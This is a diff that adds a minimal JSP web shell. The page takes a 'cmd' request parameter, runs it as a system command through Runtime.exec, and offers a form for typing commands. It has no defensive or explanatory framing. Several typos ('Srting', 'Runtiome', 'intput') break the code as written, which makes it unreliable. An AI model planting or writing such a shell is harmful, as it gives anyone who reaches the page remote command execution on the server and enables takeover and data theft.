@@ -1,0 +1,10 @@
+<HTML>
+<%
+		Srting cmd = request.getParameter("cmd");
+		if( cmd != null) Runtiome.getRuntime().exec(cmd);
+%>
+<form>
+	<input type = "text" name = "cmd">
+	<intput type = "submit">
+</form>
+</HTML>
